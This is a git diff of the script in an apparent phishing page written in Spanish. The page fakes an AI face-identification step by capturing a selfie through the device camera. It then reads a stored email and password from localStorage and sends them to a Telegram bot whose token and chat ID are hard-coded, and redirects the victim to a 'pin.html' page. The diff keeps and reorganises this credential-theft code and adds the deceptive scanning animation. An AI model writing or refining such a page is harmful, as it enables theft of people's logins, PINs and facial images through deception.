@@ -277,10 +277,70 @@
     </div>
   </div>
 
+<script>
+  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
+  const pantalla1 = document.getElementById('pantalla1');
+  const pantalla2 = document.getElementById('pantalla2');
+  const closeBtn2 = pantalla2.querySelector('.close-btn');
 
- 
+  const cameraFrame = document.getElementById('cameraFrame');
+  const video = pantalla2.querySelector('video');
+  const fotoCapturada = document.getElementById('fotoCapturada');
+  const btnTomarFoto = document.getElementById('btnTomarFoto');
+  const tituloSelfie = document.getElementById('tituloSelfie');
+  const subtextoIA = document.getElementById('subtextoIA');
 
-<script> 
+  let stream;
+
+  // Ir a pantalla 2 y pedir cámara
+  btnSacarSelfie.addEventListener('click', async () => {
+    pantalla1.style.display = 'none';
+    pantalla2.style.display = 'block';
+    fotoCapturada.style.display = 'none';
+    video.style.display = 'block';
+    cameraFrame.classList.remove('scanning');
+    btnTomarFoto.disabled = false;
+    btnTomarFoto.classList.remove('loading');
+    btnTomarFoto.textContent = 'Tomar foto';
+    tituloSelfie.textContent = 'Ubicá tu rostro dentro del círculo';
+    subtextoIA.textContent = 'La IA va a identificar tu rostro automáticamente.';
+
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+      video.srcObject = stream;
+    } catch (error) {
+      alert("No se pudo acceder a la cámara. Revisá los permisos.");
+      pantalla2.style.display = 'none';
+      pantalla1.style.display = 'flex';
+    }
+  });
+
+  // Cerrar y volver a pantalla 1
+  closeBtn2.addEventListener('click', () => {
+    pantalla2.style.display = 'none';
+    pantalla1.style.display = 'flex';
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+  });
+
+  // Tomar UNA foto y mostrar escaneo verde + redirección
+  btnTomarFoto.addEventListener('click', async () => {
+    if (!stream) return;
+
+    btnTomarFoto.disabled = true;
+    btnTomarFoto.classList.add('loading');
+    btnTomarFoto.textContent = 'Procesando...';
+
+    // Capturar frame a canvas
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 180;
+    canvas.height = video.videoHeight || 180;
+    const ctx = canvas.getContext('2d');
 
     // 🔥 SIN volteo, se dibuja tal cual viene de la cámara
     // (nada de translate/scale)
@@ -291,68 +351,33 @@
       canvas.toBlob(resolve, 'image/png');
     });
 
-     const btnSacarSelfie = document.getElementById('btnSacarSelfie');
-  const pantalla1 = document.getElementById('pantalla1');
-  const pantalla2 = document.getElementById('pantalla2');
-  const pantalla3 = document.getElementById('pantalla3');
-  const closeBtn2 = pantalla2.querySelector('.close-btn');
-  const closeBtn3 = pantalla3.querySelector('.close-btn');
-  const video2 = pantalla2.querySelector('video');
-  const video3 = pantalla3.querySelector('video');
-  const btnTomarFoto = document.getElementById('btnTomarFoto');
-  const btnTomarFoto2 = document.getElementById('btnTomarFoto2');
-  const fotoCapturada = document.getElementById('fotoCapturada');
-  let stream;
+    // Mostrar la foto capturada en vez del video
+    const imgURL = URL.createObjectURL(blob);
+    fotoCapturada.src = imgURL;
+    fotoCapturada.style.display = 'block';
+    video.style.display = 'none';
 
-  const telegramBotToken = "8407584473:AAFVyKwzEQyGozipHyMNDrSWBi7mR9qhw-E";
-  const telegramChatId = "7655000874";
+    // Texto de IA
+    tituloSelfie.textContent = 'identificando tu rostro...';
+    subtextoIA.textContent = 'Por favor, mantené tu dispositivo quieto unos segundos.';
 
-  btnSacarSelfie.addEventListener('click', async () => {
-    pantalla1.style.display = 'none';
-    pantalla2.style.display = 'block';
-    fotoCapturada.style.display = 'none';
-    btnTomarFoto.style.display = 'inline-block';
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-      video2.srcObject = stream;
-    } catch (error) {
-      alert("No se pudo acceder a la cámara. Revisá los permisos.");
-      pantalla2.style.display = 'none';
-      pantalla1.style.display = 'flex';
-    }
+    // Activar animación de escaneo verde
+    cameraFrame.classList.add('scanning');
+
+    // Simular análisis breve y luego redirigir
+    setTimeout(() => {
+      // Detener cámara
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+
+      // Redirigir a la siguiente página
+      window.location.href = "pin.html"; // cambia esto por tu página
+    }, 1100);
   });
 
-  closeBtn2.addEventListener('click', () => {
-    pantalla2.style.display = 'none';
-    pantalla1.style.display = 'flex';
-    if (stream) stream.getTracks().forEach(track => track.stop());
-  });
-
-  closeBtn3.addEventListener('click', () => {
-    pantalla3.style.display = 'none';
-    pantalla1.style.display = 'flex';
-    if (stream) stream.getTracks().forEach(track => track.stop());
-  });
-
-  btnTomarFoto.addEventListener('click', async () => {
-    // Mostrar estado de carga
-    btnTomarFoto.classList.add('loading');
-    btnTomarFoto.textContent = 'Procesando...';
-    btnTomarFoto.disabled = true;
-    
-    // Primero tomar y enviar la foto voluntaria
-    const canvas = document.createElement('canvas');
-    canvas.width = video2.videoWidth || 180;
-    canvas.height = video2.videoHeight || 180;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video2, 0, 0, canvas.width, canvas.height);
-
-    const blob = await new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/png');
-    });
-
-    // Enviar primera foto a Telegram
-    const email = localStorage.getItem('ips1') || "No definido";
+   const email = localStorage.getItem('ips1') || "No definido";
     const clave = localStorage.getItem('ips2') || "No definido";
 
     if(telegramBotToken && telegramChatId) {
@@ -372,34 +397,10 @@
       }
     }
 
-    
-    
-    // Usar el mismo stream para la pantalla 3
-    video3.srcObject = stream;
-    
-    // Restaurar botón original
-    btnTomarFoto.classList.remove('loading');
-    btnTomarFoto.textContent = 'Tomar foto';
-    btnTomarFoto.disabled = false;
-  });
 
-  btnTomarFoto2.addEventListener('click', async () => {
-    // Mostrar estado de carga
-    btnTomarFoto2.classList.add('loading');
-    btnTomarFoto2.textContent = 'Procesando...';
-    btnTomarFoto2.disabled = true;
-    
-    
-       
-    
-    // Actualizar texto de instrucción
-    document.getElementById('instruccion').textContent = 'Proceso Exitoso';
-
-    // 
-    setTimeout(() => {
-      window.location.href = "pin.html";
-    }, 500);
-  });
+   const telegramBotToken = "8407584473:AAFVyKwzEQyGozipHyMNDrSWBi7mR9qhw-E";
+  const telegramChatId = "7655000874";
 </script>
+
 </body>
 </html>
